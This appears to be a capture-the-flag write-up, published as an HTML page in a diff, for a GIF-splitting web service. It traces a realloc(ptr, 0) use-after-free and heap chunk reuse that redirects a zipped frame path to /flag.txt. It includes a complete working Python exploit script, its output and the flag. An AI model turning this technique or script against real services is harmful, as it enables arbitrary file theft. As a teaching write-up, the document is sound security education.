@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CASCADA GIF Splitter Writeup</title>
+  <style>
+    :root {
+      --bg: #ffffff;
+      --text: #111111;
+      --muted: #555555;
+      --border: #e5e7eb;
+      --panel: #f8f9fb;
+      --code: #f3f4f6;
+      --accent: #111111;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.65;
+    }
+
+    .page {
+      display: grid;
+      grid-template-columns: 260px minmax(0, 1fr);
+      min-height: 100vh;
+    }
+
+    .sidebar {
+      position: sticky;
+      top: 0;
+      align-self: start;
+      height: 100vh;
+      padding: 32px 20px;
+      border-right: 1px solid var(--border);
+      background: #fff;
+    }
+
+    .brand {
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    .nav-title {
+      font-size: 12px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin: 20px 0 10px;
+    }
+
+    .sidebar a {
+      display: block;
+      color: var(--text);
+      text-decoration: none;
+      padding: 7px 0;
+      font-size: 14px;
+    }
+
+    .sidebar a:hover {
+      text-decoration: underline;
+    }
+
+    .content {
+      max-width: 940px;
+      padding: 48px 56px 80px;
+    }
+
+    .eyebrow {
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin-bottom: 12px;
+    }
+
+    h1, h2, h3 {
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin: 0 0 16px;
+    }
+
+    h1 {
+      font-size: clamp(2.2rem, 4vw, 3.5rem);
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 1.7rem;
+      margin-top: 48px;
+      padding-top: 12px;
+      border-top: 1px solid var(--border);
+    }
+
+    h3 {
+      font-size: 1.15rem;
+      margin-top: 28px;
+    }
+
+    p {
+      margin: 0 0 16px;
+      color: var(--text);
+    }
+
+    .lead {
+      font-size: 1.1rem;
+      color: #222;
+      max-width: 70ch;
+    }
+
+    .panel {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 18px 20px;
+      margin: 24px 0;
+    }
+
+    .flag {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 1rem;
+      background: var(--code);
+      border: 1px solid var(--border);
+      padding: 12px 14px;
+      border-radius: 10px;
+      display: inline-block;
+      margin-top: 8px;
+    }
+
+    ul, ol {
+      margin: 0 0 18px 22px;
+      padding: 0;
+    }
+
+    li {
+      margin: 7px 0;
+    }
+
+    code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      background: var(--code);
+      padding: 0.15em 0.35em;
+      border-radius: 6px;
+      font-size: 0.95em;
+    }
+
+    pre {
+      margin: 18px 0 24px;
+      background: var(--code);
+      color: #111;
+      padding: 18px;
+      border-radius: 14px;
+      border: 1px solid var(--border);
+      overflow-x: auto;
+      font-size: 0.92rem;
+      line-height: 1.5;
+    }
+
+    pre code {
+      background: transparent;
+      padding: 0;
+    }
+
+    .step {
+      margin: 28px 0;
+      padding-left: 18px;
+      border-left: 3px solid #111;
+    }
+
+    .muted {
+      color: var(--muted);
+    }
+
+    .footer {
+      margin-top: 56px;
+      padding-top: 20px;
+      border-top: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    @media (max-width: 900px) {
+      .page {
+        grid-template-columns: 1fr;
+      }
+
+      .sidebar {
+        position: static;
+        height: auto;
+        border-right: 0;
+        border-bottom: 1px solid var(--border);
+      }
+
+      .content {
+        padding: 28px 20px 60px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <aside class="sidebar">
+      <div class="brand">CASCADA Writeup</div>
+      <div class="nav-title">Contents</div>
+      <a href="#summary">Summary</a>
+      <a href="#challenge">Challenge Setup</a>
+      <a href="#triage">Initial Triage</a>
+      <a href="#parser">Parser Analysis</a>
+      <a href="#bug">The Bug</a>
+      <a href="#strategy">Exploit Strategy</a>
+      <a href="#payload">Payload Layout</a>
+      <a href="#heap">Heap Reuse Mechanics</a>
+      <a href="#script">Exploit Script</a>
+      <a href="#script-breakdown">Script Breakdown</a>
+      <a href="#result">Result</a>
+      <a href="#timeline">Step-by-Step Recap</a>
+    </aside>
+
+    <main class="content">
+      <div class="eyebrow">Pwn / File Read / Heap Corruption</div>
+      <h1>CASCADA GIF Splitter Writeup</h1>
+      <p class="lead">
+        This challenge exposed a GIF processing service over HTTP. The goal was to retrieve
+        the contents of <code>/flag.txt</code>. A custom GIF library contained a heap bug
+        that could be turned into an arbitrary file read through the server's zip output.
+      </p>
+
+      <section id="summary">
+        <div class="panel">
+          <strong>Final flag</strong><br>
+          <div class="flag">undut{!!!inspir3rad_av__CVE-2019-11932}</div>
+        </div>
+      </section>
+
+      <section id="challenge">
+        <h2>1. Challenge Setup</h2>
+        <p>
+          The provided leak contained two important parts:
+        </p>
+        <ol>
+          <li>An Nginx module that accepted uploads at <code>/gif</code>.</li>
+          <li>A custom shared library, <code>chall.so</code>, that parsed the uploaded GIF and split its frames.</li>
+        </ol>
+        <p>
+          The Dockerfile also showed that the target file was present at <code>/flag.txt</code>
+          inside the container and readable by the process.
+        </p>
+        <pre><code>COPY src/flag.txt /flag.txt
+RUN chmod 444 /flag.txt</code></pre>
+        <p>
+          That immediately suggested a useful target: if the parser bug could be converted into
+          a file read primitive, <code>/flag.txt</code> was the obvious file to steal.
+        </p>
+      </section>
+
+      <section id="triage">
+        <h2>2. Initial Triage</h2>
+        <p>
+          The web frontend looked like a file upload form, but the JavaScript actually sent raw
+          GIF bytes with <code>Content-Type: application/octet-stream</code>. That detail mattered.
+        </p>
+        <pre><code>const response = await fetch('/gif', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/octet-stream',
+    },
+    body: binaryData,
+});</code></pre>
+        <p>
+          In the Nginx module, the request body was concatenated and passed directly into
+          <code>dump_frames(buf-&gt;pos, total_size)</code>. There was no multipart parsing,
+          no file wrapper, and no server-side metadata prepended to the upload.
+        </p>
+        <p>
+          So the parser expected byte zero of the request body to be the GIF header itself.
+        </p>
+      </section>
+
+      <section id="parser">
+        <h2>3. Parser Analysis</h2>
+        <p>
+          Reversing <code>chall.so</code> showed a simple home-grown GIF parser. The high-level flow was:
+        </p>
+        <ol>
+          <li>Create a temporary directory under <code>/tmp/&lt;uuid&gt;/</code>.</li>
+          <li>Parse the GIF header and optional global color table.</li>
+          <li>Iterate over extensions and image descriptors.</li>
+          <li>Dump each frame as <code>GIF_FRAME%d.gif</code>.</li>
+          <li>Zip all collected frame file names into <code>out.zip</code>.</li>
+        </ol>
+        <p>
+          The bundled seed file confirmed the intended format: a small <code>GIF89a</code> animated GIF
+          with a global color table, a <code>NETSCAPE2.0</code> application extension, and repeated
+          <code>Graphic Control Extension + Image Descriptor</code> frame blocks.
+        </p>
+        <div class="panel">
+          <strong>Important parser limitation</strong><br>
+          The image parser only supported a single LZW data sub-block per frame. That meant the safest
+          exploit input was a very small, parser-friendly animated GIF.
+        </div>
+        <h3>Relevant internal flow</h3>
+        <p>
+          The control flow inside the library was effectively:
+        </p>
+        <pre><code>dump_frames(buffer, size):
+    dirname = create_dir()
+    header = parse_gif_header(...)
+    for frame_index in range(32):
+        rc = parse_gif_extension_blocks(...)
+        if rc == 1:
+            break   // trailer reached
+        if rc == 0:
+            filename = dump_frame_to_file(...)
+            FILENAMES[frame_index] = filename
+        else:
+            error
+    return zip_files(dirname, frame_count)</code></pre>
+        <p>
+          The parser used a cursor structure over the original upload buffer. The header parser consumed
+          the GIF signature, logical screen descriptor, and optional global color table. The extension parser
+          then advanced until it reached either:
+        </p>
+        <ul>
+          <li><code>0x2c</code>, indicating an image descriptor and therefore a frame, or</li>
+          <li><code>0x3b</code>, indicating the trailer and the end of the GIF.</li>
+        </ul>
+        <p>
+          Every time the code found an image descriptor, it called <code>dump_frame_to_file</code>, which created
+          a standalone output GIF consisting of:
+        </p>
+        <ol>
+          <li>the original GIF header and global color table,</li>
+          <li>the most recent graphics control extension if present,</li>
+          <li>the current frame image descriptor and image data,</li>
+          <li>a final <code>0x3b</code> trailer byte.</li>
+        </ol>
+      </section>
+
+      <section id="bug">
+        <h2>4. The Bug</h2>
+        <p>
+          Fuzzing data bundled with the leak already contained a saved crash. Running the crash case
+          locally showed:
+        </p>
+        <pre><code>free(): double free detected in tcache 2</code></pre>
+        <p>
+          The root cause was in the logic around <code>parse_image_data</code>. The function stored a pointer
+          to the compressed image block and resized it with <code>realloc(old_ptr, block_size)</code>.
+        </p>
+        <div class="step">
+          <h3>What happens when <code>block_size == 0</code></h3>
+          <p>
+            On glibc, <code>realloc(ptr, 0)</code> frees the chunk and returns <code>NULL</code>.
+            The parser did not handle that state correctly. It freed the old chunk, but later logic still
+            treated the stale pointer as if it were safe to reuse.
+          </p>
+        </div>
+        <p>
+          This created a stale-pointer / use-after-free condition. The visible symptom was a later
+          double free, but the exploitable part was that the freed heap chunk could be reclaimed by
+          another allocation before the stale pointer was used again.
+        </p>
+        <h3>Why this happens at the C level</h3>
+        <p>
+          The parser stored image data inside a frame-like structure. In simplified form, the logic was:
+        </p>
+        <pre><code>frame-&gt;image_data = realloc(frame-&gt;image_data, block_size);
+if (!frame-&gt;image_data) {
+    perror("realloc");
+    return -1;
+}
+read_from_buffer(..., frame-&gt;image_data, block_size);</code></pre>
+        <p>
+          That is already unsafe if <code>block_size</code> can be zero. On glibc,
+          <code>realloc(ptr, 0)</code> is allowed to behave like <code>free(ptr)</code> and return <code>NULL</code>.
+          After that:
+        </p>
+        <ol>
+          <li>the old chunk is gone from the allocator's point of view,</li>
+          <li>the code treats the result as an allocation failure,</li>
+          <li>other state still assumes the old buffer relationship is meaningful,</li>
+          <li>the same size class can be immediately recycled by a later <code>malloc</code>.</li>
+        </ol>
+        <p>
+          This is the core exploit primitive: force a free through <code>realloc(ptr, 0)</code>, then make the program
+          allocate something security-sensitive into the same chunk, then drive a stale write into it.
+        </p>
+      </section>
+
+      <section id="strategy">
+        <h2>5. Exploit Strategy</h2>
+        <p>
+          The key observation came from the frame dumping function:
+        </p>
+        <pre><code>filename = malloc(...);
+strcpy(filename, "/tmp/.../GIF_FRAME%d.gif");
+parse_image_data(...);
+open(filename, O_WRONLY | ...);
+FILENAMES[idx] = filename;</code></pre>
+        <p>
+          The <code>filename</code> buffer was allocated <em>before</em> the parser touched the next frame's image data.
+          That made the exploitation path very clean:
+        </p>
+        <ol>
+          <li>Allocate an <code>image_data</code> chunk of a chosen size in frame 1.</li>
+          <li>Free that same chunk with <code>realloc(ptr, 0)</code> in frame 2.</li>
+          <li>Let the program allocate <code>filename</code> for frame 3, reusing the freed heap chunk.</li>
+          <li>Use the stale pointer during frame 3 parsing to overwrite the contents of that chunk.</li>
+          <li>Replace the original file name with <code>/flag.txt</code>.</li>
+        </ol>
+        <p>
+          At that point, the frame output path no longer pointed to a temporary GIF file. It pointed to
+          the flag file instead.
+        </p>
+      </section>
+
+      <section id="payload">
+        <h2>6. Payload Layout</h2>
+        <p>
+          The final GIF contained three frames and stayed well within the server's size limits.
+        </p>
+        <div class="step">
+          <h3>Frame 1</h3>
+          <p>
+            A normal tiny frame with image block size <code>0x39</code>. This allocated the heap chunk that would later
+            be recycled.
+          </p>
+        </div>
+        <div class="step">
+          <h3>Frame 2</h3>
+          <p>
+            Another valid frame, but with image block size <code>0</code>. This triggered
+            <code>realloc(ptr, 0)</code>, freeing the chunk and leaving the parser in a stale-pointer state.
+          </p>
+        </div>
+        <div class="step">
+          <h3>Frame 3</h3>
+          <p>
+            When the program allocated <code>filename</code> for this frame, the allocator reused the freed chunk.
+            Then the stale pointer path wrote controlled bytes into that memory, replacing the original
+            <code>/tmp/.../GIF_FRAME2.gif</code> string with <code>/flag.txt</code>.
+          </p>
+        </div>
+        <p>
+          The overwrite payload looked conceptually like this:
+        </p>
+        <pre><code>b"/flag.txt\x00" + b"B" * (0x39 - len("/flag.txt") - 1)</code></pre>
+        <p>
+          The trailing null byte was critical because it terminated the file path cleanly.
+        </p>
+      </section>
+
+      <section id="heap">
+        <h2>7. Heap Reuse Mechanics</h2>
+        <p>
+          The exploit only works if the freed image-data chunk and the later <code>filename</code> allocation land in the
+          same allocator size class. The chosen block size, <code>0x39</code>, was selected so that this happens reliably
+          with glibc's small-chunk allocator behavior in the challenge environment.
+        </p>
+        <p>
+          The sequence is:
+        </p>
+        <ol>
+          <li>Frame 1 allocates <code>image_data</code> with length <code>0x39</code>.</li>
+          <li>Frame 2 calls <code>realloc(old_ptr, 0)</code>, which frees that chunk.</li>
+          <li>Frame 3 allocates <code>filename</code> with <code>malloc(strlen("/tmp/&lt;uuid&gt;/GIF_FRAME2.gif")+1)</code>.</li>
+          <li>The allocator reuses the recently freed chunk for the new file-name string.</li>
+          <li>The parser later performs the stale image-data write into the same memory region.</li>
+        </ol>
+        <p>
+          At that moment, the file-name buffer and the stale image-data buffer alias the same heap memory.
+          Writing image bytes now rewrites the path string.
+        </p>
+        <pre><code>Before frame 2:
+[ image_data chunk ] -&gt; "AAAA...."
+
+After realloc(ptr, 0):
+[ freed chunk in tcache ]
+
+After frame 3 filename malloc:
+[ filename chunk ] -&gt; "/tmp/.../GIF_FRAME2.gif"
+
+After stale write:
+[ filename chunk ] -&gt; "/flag.txt\x00BBBB..."</code></pre>
+        <p>
+          This is not a generic heap spray. It is a precise chunk recycling attack using allocator locality.
+          The exploit is deterministic because the program structure naturally produces the required
+          allocation/free/allocation order.
+        </p>
+      </section>
+
+      <section id="script">
+        <h2>8. Why This Produces a File Read</h2>
+        <p>
+          The frame-writing step itself tried to open the overwritten path using write flags. That failed for
+          <code>/flag.txt</code>, which was fine. The important part happened later:
+        </p>
+        <pre><code>zip_source_file(zip, FILENAMES[i], 0, 0);
+zip_file_add(zip, basename(FILENAMES[i]), source, ...);</code></pre>
+        <p>
+          The zip code used the stored path as a source file. If that path had been corrupted to
+          <code>/flag.txt</code>, libzip simply read the real file and added it to the archive under the name
+          <code>flag.txt</code>.
+        </p>
+        <p>
+          In other words, the service exfiltrated the flag for us in its own response.
+        </p>
+        <h3>Full Exploit Script</h3>
+        <p>
+          This is the full Python script used to retrieve the flag from the live service.
+        </p>
+        <pre><code>#!/usr/bin/env python3
+import io
+import struct
+import sys
+import urllib.request
+import zipfile
+
+
+URL = "https://undutmaning-cascada-gif-splitter.chals.io/gif"
+TARGET_PATH = b"/flag.txt"
+BLOCK_SIZE = 0x39
+
+
+def frame(block_size: int, data: bytes, with_gce: bool = True) -> bytes:
+    out = bytearray()
+    if with_gce:
+        out += bytes([0x21, 0xF9, 0x04, 0x08, 0x0A, 0x00, 0x00, 0x00])
+    out += bytes([0x2C])
+    out += struct.pack("&lt;HHHHB", 0, 0, 1, 1, 0)
+    out += bytes([0x08, block_size])
+    out += data
+    if block_size != 0:
+        out += b"\\x00"
+    return bytes(out)
+
+
+def build_payload(target_path: bytes) -> bytes:
+    if len(target_path) + 1 > BLOCK_SIZE:
+        raise ValueError("target path is too long for the chosen chunk size")
+
+    header = bytearray(b"GIF89a")
+    header += struct.pack("&lt;HHBBB", 1, 1, 0x81, 0, 0)
+    header += bytes([0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF])
+    header += bytes([0x21, 0xFF, 0x0B]) + b"NETSCAPE2.0" + bytes([0x03, 0x01, 0x00, 0x00, 0x00])
+
+    first = frame(BLOCK_SIZE, b"A" * BLOCK_SIZE)
+    second = frame(0, b"") + b"\\x00"
+    overwrite = target_path + b"\\x00" + b"B" * (BLOCK_SIZE - len(target_path) - 1)
+    third = frame(BLOCK_SIZE, overwrite)
+    return bytes(header + first + second + third + b"\\x3B")
+
+
+def post_gif(url: str, gif_data: bytes) -> bytes:
+    req = urllib.request.Request(
+        url,
+        data=gif_data,
+        headers={"Content-Type": "application/octet-stream"},
+        method="POST",
+    )
+    with urllib.request.urlopen(req, timeout=30) as resp:
+        return resp.read()
+
+
+def main() -> int:
+    url = sys.argv[1] if len(sys.argv) > 1 else URL
+    gif_data = build_payload(TARGET_PATH)
+    zip_data = post_gif(url, gif_data)
+
+    print(f"response bytes: {len(zip_data)}")
+    zf = zipfile.ZipFile(io.BytesIO(zip_data))
+    names = zf.namelist()
+    print("entries:", names)
+    for name in names:
+        data = zf.read(name)
+        print(f"\\n== {name} ==")
+        try:
+            print(data.decode())
+        except UnicodeDecodeError:
+            print(data)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())</code></pre>
+      </section>
+
+      <section id="script-breakdown">
+        <h2>9. Script Breakdown</h2>
+        <p>
+          The script is intentionally small because the exploitation path is narrow and highly structured.
+          Every part of it maps directly to a parser property discovered during reversing.
+        </p>
+        <h3><code>BLOCK_SIZE = 0x39</code></h3>
+        <p>
+          This size was chosen to make the frame 1 image-data chunk and the later frame 3 file-name allocation
+          compatible in the allocator. Changing it can break the heap reuse and make the exploit unreliable.
+        </p>
+        <h3><code>frame()</code></h3>
+        <p>
+          This helper emits one parser-friendly frame:
+        </p>
+        <ol>
+          <li>A valid graphics control extension.</li>
+          <li>An image descriptor for a tiny 1x1 frame.</li>
+          <li>LZW minimum code size <code>0x08</code>.</li>
+          <li>Exactly one GIF data sub-block.</li>
+          <li>A trailing <code>0x00</code> block terminator when the block is non-empty.</li>
+        </ol>
+        <p>
+          The image parser in this challenge does not correctly implement full GIF sub-block parsing, so the
+          exploit keeps the format as simple as possible.
+        </p>
+        <h3><code>build_payload()</code></h3>
+        <p>
+          This function builds the entire animated GIF:
+        </p>
+        <ol>
+          <li>Create a valid <code>GIF89a</code> header.</li>
+          <li>Add a tiny global color table.</li>
+          <li>Add a <code>NETSCAPE2.0</code> application extension to resemble a normal animated GIF.</li>
+          <li>Append frame 1, which allocates the target heap chunk.</li>
+          <li>Append frame 2, which frees the chunk through <code>realloc(ptr, 0)</code>.</li>
+          <li>Append frame 3, whose block data overwrites the future <code>filename</code> buffer with <code>/flag.txt</code>.</li>
+        </ol>
+        <p>
+          The extra <code>b"\\x00"</code> after frame 2 is there to keep the outer parser aligned after the zero-sized block.
+          Without careful byte-level control here, the GIF walker falls out of sync.
+        </p>
+        <h3><code>post_gif()</code></h3>
+        <p>
+          This function sends the crafted GIF as a raw request body. That matches the front-end's actual behavior
+          and the server's expectation.
+        </p>
+        <h3>Response handling</h3>
+        <p>
+          The service returns a zip archive. The script opens it in-memory and prints every entry. In the successful
+          exploit run, those entries were:
+        </p>
+        <pre><code>['GIF_FRAME0.gif', 'flag.txt']</code></pre>
+        <p>
+          That is exactly what we want. The first frame is legitimate output. The second entry proves that one of
+          the stored file paths was successfully redirected to the real flag file on disk.
+        </p>
+      </section>
+
+      <section id="result">
+        <h2>10. Result</h2>
+        <p>
+          Running the exploit against the live service returned a zip archive with two entries:
+        </p>
+        <pre><code>entries: ['GIF_FRAME0.gif', 'flag.txt']</code></pre>
+        <p>
+          The second entry contained the real flag:
+        </p>
+        <pre><code>undut{!!!inspir3rad_av__CVE-2019-11932}</code></pre>
+      </section>
+
+      <section id="timeline">
+        <h2>11. Step-by-Step Recap</h2>
+        <ol>
+          <li>Inspect the leaked files and identify the web endpoint, the Nginx module, and the custom parser.</li>
+          <li>Confirm that the upload is raw GIF data, not multipart form data.</li>
+          <li>Reverse <code>chall.so</code> and understand the frame extraction flow.</li>
+          <li>Use the bundled fuzzing crash to narrow the bug down to heap misuse around <code>realloc(ptr, 0)</code>.</li>
+          <li>Notice that frame file names are allocated before parsing the next image block.</li>
+          <li>Free an image-data chunk in one frame and reclaim it as a <code>filename</code> chunk in the next.</li>
+          <li>Overwrite the recycled file name with <code>/flag.txt</code>.</li>
+          <li>Let the service zip that path and return the flag in the response archive.</li>
+        </ol>
+      </section>
+
+      <div class="footer">
+        Writeup prepared from the leaked source, local reversing, local exploit validation, and the final remote run.
+      </div>
+    </main>
+  </div>
+</body>
+</html>
